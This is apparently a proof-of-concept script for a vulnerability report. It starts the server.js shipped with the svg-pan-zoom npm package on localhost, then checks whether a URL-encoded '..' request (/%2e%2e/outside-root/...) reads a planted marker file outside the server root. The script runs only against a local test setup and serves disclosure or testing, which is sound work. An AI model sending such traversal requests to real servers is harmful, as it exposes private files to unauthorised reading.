const http = require("http");
const path = require("path");
const { spawn } = require("child_process");

const verifyRoot = __dirname;
const serverRoot = path.join(verifyRoot, "server-root");
const serverJs = resolvePackageServer();
const port = 3139;

function resolvePackageServer() {
  const packageJson = require.resolve("svg-pan-zoom/package.json", {
    paths: [verifyRoot, process.cwd()],
  });
  return path.join(path.dirname(packageJson), "server.js");
}

function displayPath(absolutePath) {
  return path.relative(verifyRoot, absolutePath) || ".";
}

function request(pathname) {
  return new Promise((resolve, reject) => {
    const req = http.get(
      {
        hostname: "127.0.0.1",
        port,
        path: pathname,
      },
      (res) => {
        let body = "";
        res.setEncoding("utf8");
        res.on("data", (chunk) => {
          body += chunk;
        });
        res.on("end", () => {
          resolve({
            statusCode: res.statusCode,
            body,
          });
        });
      }
    );

    req.on("error", reject);
    req.setTimeout(5000, () => {
      req.destroy(new Error("request timed out"));
    });
  });
}

function waitForServer(child) {
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      reject(new Error("server did not start in time"));
    }, 5000);

    child.stdout.on("data", (data) => {
      const text = data.toString();
      process.stdout.write("[server] " + text);
      if (text.includes("Http Server running")) {
        clearTimeout(timeout);
        resolve();
      }
    });

    child.stderr.on("data", (data) => {
      process.stderr.write("[server:err] " + data.toString());
    });

    child.on("exit", (code) => {
      clearTimeout(timeout);
      reject(new Error("server exited before verification, code=" + code));
    });
  });
}

async function main() {
  console.log("Using server.js: svg-pan-zoom/server.js (resolved by Node.js)");
  console.log("Verification directory:", displayPath(verifyRoot));
  console.log("Server working directory:", displayPath(serverRoot));

  const shim = path.join(verifyRoot, "util-puts-shim.js");
  const child = spawn(process.execPath, ["-r", shim, serverJs, String(port)], {
    cwd: serverRoot,
    stdio: ["ignore", "pipe", "pipe"],
  });

  try {
    await waitForServer(child);

    const normal = await request("/public/hello.txt");
    const traversal = await request("/%2e%2e/outside-root/verify_9_parent_secret.txt");

    console.log("\n[normal]");
    console.log("GET /public/hello.txt");
    console.log("status:", normal.statusCode);
    console.log("contains expected marker:", normal.body.includes("NORMAL_STATIC_FILE_FROM_VERIFY_ROOT"));

    console.log("\n[traversal]");
    console.log("GET /%2e%2e/outside-root/verify_9_parent_secret.txt");
    console.log("status:", traversal.statusCode);
    console.log(
      "contains parent marker:",
      traversal.body.includes("PARENT_SECRET_FOR_SVG_PAN_ZOOM_TRAVERSAL_VERIFY")
    );

    if (
      normal.statusCode === 200 &&
      normal.body.includes("NORMAL_STATIC_FILE_FROM_VERIFY_ROOT") &&
      traversal.statusCode === 200 &&
      traversal.body.includes("PARENT_SECRET_FOR_SVG_PAN_ZOOM_TRAVERSAL_VERIFY")
    ) {
      console.log("\nRESULT: VULNERABLE - encoded .. escaped the server working directory.");
      process.exitCode = 0;
    } else {
      console.log("\nRESULT: NOT CONFIRMED - expected markers were not both returned.");
      process.exitCode = 1;
    }
  } finally {
    child.kill();
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
